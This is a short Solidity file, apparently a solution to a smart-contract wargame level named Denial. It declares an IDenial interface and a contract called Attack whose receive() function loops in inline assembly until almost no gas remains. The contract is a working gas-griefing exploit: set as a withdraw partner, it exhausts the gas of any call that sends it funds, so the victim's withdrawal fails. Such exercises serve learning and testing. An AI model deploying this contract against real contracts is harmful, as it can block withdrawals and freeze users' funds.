// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IDenial {
    function withdraw() external;
    function setWithdrawPartner(address _partner) external; 
}

contract Attack {
    receive() external payable {

        assembly {
            let x := 0
            for { } gt(gas(), 2000) { } {
                x := add(x, 1)
            }
        }
    }
}